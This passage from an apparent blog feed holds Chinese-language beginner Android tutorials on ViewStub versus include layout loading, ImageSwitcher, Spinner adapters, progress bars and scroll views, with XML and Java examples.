class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"@string/hello_world"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个样子就可以了，然后我们就在头部有了我们写好的title.xml文件。<br><img src="img1.jpg" alt="静态加载"><br>如果我们在这个include节点中配置一些属性，例如宽高的话呢是没有用的，这个要看被加载的XML文件是做了什么的。</p>
<h2 id="动态加载ViewStub"><a href="#动态加载ViewStub" class="headerlink" title="动态加载ViewStub"></a>动态加载<code>ViewStub</code></h2><p>首先我们要先定义XML：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> &gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ViewStub</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/viewstub"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout</span>=<span class="string">"@layout/title"</span> /&gt;</span><span class="comment">&lt;!-- ViewStub中的属性是优先于布局里面的属性的与include是相反的 --&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/textView1"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"TextView"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/button1"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Button"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到动态加载的话呢我们是用到<code>ViewStub</code>进行加载的，属性中与include不同的是，include是layout，而动态加载的话呢是：<code>android:layout</code>。<br>而且动态加载中的属性是权限高的，即使title.xml设置了，我们还是遵循ViewStub的规则。<br>那我们如何动态的加载呢？<br>看java代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> ViewStub Vs;</span><br><span class="line"><span class="keyword">private</span> Button btn1;</span><br></pre></td></tr></table></figure>
<p>先声明变量，和普通控件一样，然后我们再初始化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">	setContentView(R.layout.viewstub);</span><br><span class="line">	Vs = (ViewStub) findViewById(R.id.viewstub);</span><br><span class="line">	btn1 = (Button) findViewById(R.id.button1);</span><br><span class="line">	btn1.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">			LinearLayout Lv = (LinearLayout) Vs.inflate();<span class="comment">//获取加载的布局</span></span><br><span class="line">			<span class="comment">//之后我们就不能在通过这个对象调用inflate了，因为这个对象就置为空了</span></span><br><span class="line">			<span class="comment">//Vs.setVisibility(View.VISIBLE);</span></span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们返回的<code>LinearLayout</code>这个对象是可以操作的，但是有一点要注意了，我们的<code>ViewStub</code>在用过<code>inflate</code>方法之后，这个对象的这个方法是不能再重新调用了的，否则会出错，空布局的错误，因为这个布局我们得到过一次了，反正谷歌是这么说的。当然我们如果不想用<code>inflate</code>方法的话呢我们也还是可以用<code>setVisibility</code>这个方法的，效果是一样的，而且第二次调用还不会出错，设置不可见也是可以的（View.INVISIBLE），但是会占用位置，因为只是不可见，但是布局中还是你有他的位置。<br><img src="img2.jpg" alt="动态加载"></p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android ImageSwitcher</title>
    <url>/2020/02/09/Android-ImageSwitcher/</url>
    <content><![CDATA[<h2 id="ImageSwitcher"><a href="#ImageSwitcher" class="headerlink" title="ImageSwitcher"></a>ImageSwitcher</h2><p>就是一个图片显示的一个小工厂类似的东西，使用起来也比较的简单。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ImageSwitcher</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/imageswitcher"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"300dip"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"200dip"</span></span></span><br><span class="line"><span class="tag">    &gt;</span><span class="tag">&lt;/<span class="name">ImageSwitcher</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们来编写java的代码<br>先定义一个int数组：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span>[] imageId = &#123;R.drawable.ic_launcher,R.drawable.ic_launcher,R.drawable.ic_launcher,R.drawable.ic_launcher&#125;;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> index = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>这个里面存放着我们的图片ID编号。</p>
<p>然后我们初始化一些这个图片工厂控件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">iS = (ImageSwitcher) findViewById(R.id.imageswitcher);</span><br><span class="line">iS.setFactory(<span class="keyword">this</span>);<span class="comment">//设置切换image对象</span></span><br><span class="line">iS.setImageResource(imageId[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>
<p>这个<code>setFactory</code>必须要有，就是设置一个图片工厂，需要new一个类，我们就写this就可以了，因为我们还需要<br><code>implements ViewFactory</code><br>实现他的一个接口，如果是new的话呢也是可以的。<br>然后我们就可以来重写这个接口里面的一个方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> View <span class="title">makeView</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> ImageView(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个就是返回一个ImageView的一个对象，这个我们可以修改这个ImageView的一些属性，所以我们称这个组件是个工厂，这里我们就不设置了。<br>然后我们用按钮切换的话呢就简单的这样子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (v.getId()) &#123;</span><br><span class="line">	<span class="keyword">case</span> R.id.btn1:</span><br><span class="line">		index++;</span><br><span class="line">		<span class="keyword">if</span>(index&gt;=imageId.length)</span><br><span class="line">			index = <span class="number">0</span>;</span><br><span class="line">		iS.setImageResource(imageId[index]);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> R.id.btn2:</span><br><span class="line">		index--;</span><br><span class="line">		<span class="keyword">if</span>(index &lt;<span class="number">0</span>)</span><br><span class="line">			index = imageId.length-<span class="number">1</span>;</span><br><span class="line">		iS.setImageResource(imageId[index]);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>setImageResource</code>这个方法我们传进去一个图片ID就可以，我们用数组元素传进去就可以，上面定义了的。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Spinner</title>
    <url>/2020/02/09/Android-Spinner/</url>
    <content><![CDATA[<h2 id="Spinner控件"><a href="#Spinner控件" class="headerlink" title="Spinner控件"></a>Spinner控件</h2><p>就是一个下拉列表的控件，供用户选择内容的。这个东西也是需要一个适配器的，就和我们之前用到的那个提示文本框一样。</p>
<h2 id="预定义适配器"><a href="#预定义适配器" class="headerlink" title="预定义适配器"></a>预定义适配器</h2><p>就是安卓为了开发的方便，给我们提供了一些安卓自定义的一些控件。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] strArr = <span class="keyword">new</span> String[]&#123;<span class="string">"Wker"</span>,<span class="string">"Wker帅"</span>,<span class="string">"Wker酷"</span>&#125;;</span><br><span class="line">ArrayAdapter&lt;String&gt; Adapter = <span class="keyword">new</span> ArrayAdapter&lt;String&gt;(<span class="keyword">this</span>,android.R.layout.simple_list_item_checked,strArr);</span><br><span class="line">sp1.setAdapter(Adapter);</span><br></pre></td></tr></table></figure>
<p>这个理解起来比较简单，就是我们先配置一个数组，然后适配器的第一个参数是一个上下文，第二个参数是布局，我们这里用的是预定义的，第三个参数就是我们需要填写的内容，最后我们将这个给下拉列表框设置上去。</p>
<h2 id="自定义布局适配器"><a href="#自定义布局适配器" class="headerlink" title="自定义布局适配器"></a>自定义布局适配器</h2><p>这个比较好用，我感觉后期开发经常用得到，就是我们通过自己的布局文件加载这个选项。<br>首先我们先布局一个layout</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"horizontal"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:gravity</span>=<span class="string">"center_vertical"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/ImageView1"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/TextView1"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>           </span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Test"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个布局使我们用来设置下拉列表框的一个布局的。然后我们编写java代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Map&lt;String,Object&gt;&gt; MyList = <span class="keyword">new</span> ArrayList&lt;Map&lt;String,Object&gt;&gt;();</span><br><span class="line">Map&lt;String,Object&gt; map1 = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">map1.put(<span class="string">"icon"</span>, R.drawable.ic_launcher);</span><br><span class="line">map1.put(<span class="string">"Text"</span>, <span class="string">"Wker"</span>);</span><br><span class="line">MyList.add(map1);</span><br><span class="line"></span><br><span class="line">Map&lt;String,Object&gt; map2 = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">map2.put(<span class="string">"icon"</span>, R.drawable.ic_launcher);</span><br><span class="line">map2.put(<span class="string">"Text"</span>, <span class="string">"Ws"</span>);</span><br><span class="line">MyList.add(map2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SimpleAdapter Adapter1 = <span class="keyword">new</span> SimpleAdapter(<span class="keyword">this</span>, MyList, R.layout.my_sp, <span class="keyword">new</span> String[]&#123;<span class="string">"icon"</span>,<span class="string">"Text"</span>&#125;, <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;R.id.ImageView1,R.id.TextView1&#125;);</span><br><span class="line">sp2.setAdapter(Adapter1);</span><br></pre></td></tr></table></figure>
<p>这个东西看着有点复杂，其实也是比较好理解的。</p>
<p>首先我们先定义一个集合，这个集合承载的一些map，这些map是用String对应Object的。<br>然后我们向这个List里面添加我们的map，这里需要对应好，因为我们的Value是Object，所以可以是所有类型，我们添加好之后，然后初始化我们的适配器，SimpleAdapter的构造函数，第一个就是我们的上下文，第二个是布局文件，第三个是map中Key的值作为一个数组传进去，也就是表项字段的值，最后一个参数就是我们Value在布局文件中的一个对应id。其实我们看这个参数名称也能看出来最后两个，分别是from和to，体会一下就知道了。<br>这里需要注意的是，List中有多少个map就会有多少个选择项，map对应的就是有几列。<br><img src="img1.jpg" alt="效果图"></p>
<p>添加一个点击事件：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sp2.setOnItemSelectedListener(<span class="keyword">new</span> OnItemSelectedListener() &#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onItemSelected</span><span class="params">(AdapterView&lt;?&gt; parent, View view, <span class="keyword">int</span> position, <span class="keyword">long</span> id)</span> </span>&#123;</span><br><span class="line">		Spinner sp = (Spinner)parent;</span><br><span class="line">		<span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">		Map&lt;String,Object&gt; map = (Map&lt;String, Object&gt;) sp.getItemAtPosition(position);</span><br><span class="line">		MainActivity.<span class="keyword">this</span>.setTitle((CharSequence) map.get(<span class="string">"Text"</span>));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onNothingSelected</span><span class="params">(AdapterView&lt;?&gt; parent)</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>这个的话呢就是比较好理解了，首先我们现将我们的触发源强制转换成我们的Spinner对象，然后getItem通过传进来的position，因为我们知道是map，所以这里可以强转，<code>@SuppressWarnings(&quot;unchecked&quot;)</code>这个注解就是告诉编译器，这个强制转换的警告就不要提示了。最后我们在通过map获取我们的内容。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓进度条与滚动条</title>
    <url>/2020/02/08/%E5%AE%89%E5%8D%93%E8%BF%9B%E5%BA%A6%E6%9D%A1%E4%B8%8E%E6%BB%9A%E5%8A%A8%E6%9D%A1/</url>
    <content><![CDATA[<h2 id="进度条"><a href="#进度条" class="headerlink" title="进度条"></a>进度条</h2><p>这个比较的简单，基本没啥太多的。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ProgressBar</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/progressBar2"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">style</span>=<span class="string">"?android:attr/progressBarStyleSmall"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ProgressBar</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/progressBar1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">style</span>=<span class="string">"?android:attr/progressBarStyleLarge"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_alignLeft</span>=<span class="string">"@+id/progressBar2"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_below</span>=<span class="string">"@+id/progressBar2"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ProgressBar</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/progressBar3"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">style</span>=<span class="string">"?android:attr/progressBarStyleHorizontal"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_alignLeft</span>=<span class="string">"@+id/progressBar1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_below</span>=<span class="string">"@+id/progressBar1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:progress</span>=<span class="string">"30"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:secondaryProgress</span>=<span class="string">"60"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到，比较关键的<code>style</code>属性，有那么几个显示的值，好像比较特别一些，之后深究。<code>?android:attr/progressBarStyleHorizontal</code>这个可以设置进度，上面两个是两个转的小圈圈。<br>但代码层次简单的进度显示是比较简单的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">pro.setProgress((<span class="keyword">int</span>) (pro.getProgress()*<span class="number">1.2</span>));</span><br></pre></td></tr></table></figure>
<p>这样就能进行设置了。</p>
<h2 id="滚动条"><a href="#滚动条" class="headerlink" title="滚动条"></a>滚动条</h2><p>这个代码层基本用不到，就是UI设计的时候用的，有两个，一个垂直滚动，一个横向滚动，UI设计的时候也是一样的，唯一注意的就是这个控件里面只允许防止一个子节点，所以我们一般放一个布局进去，这个样子就会正常使用了，而且我们一般用：LinearLayout，因为这个是流，很是配合，具体代码如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ScrollView</span> </span></span><br><span class="line"><span class="tag">	   	 <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">		 <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">		 <span class="attr">android:scrollbars</span>=<span class="string">"none"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">LinearLayout</span> </span></span><br><span class="line"><span class="tag">     <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">		 <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">     <span class="attr">android:orientation</span>=<span class="string">"vertical"</span></span></span><br><span class="line"><span class="tag">        &gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	        /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	        /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	        /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	        /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	        /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	        /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	        /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	        /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	        /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	        /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	        /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	        /&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">ScrollView</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">HorizontalScrollView</span> </span></span><br><span class="line"><span class="tag">	<span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">	<span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>         </span></span><br><span class="line"><span class="tag">    <span class="attr">android:scrollbars</span>=<span class="string">"none"</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">LinearLayout</span> </span></span><br><span class="line"><span class="tag">     <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">		 <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">     <span class="attr">android:orientation</span>=<span class="string">"horizontal"</span></span></span><br><span class="line"><span class="tag">        &gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	        /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	        /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	        /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	        /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:src</span>=<span 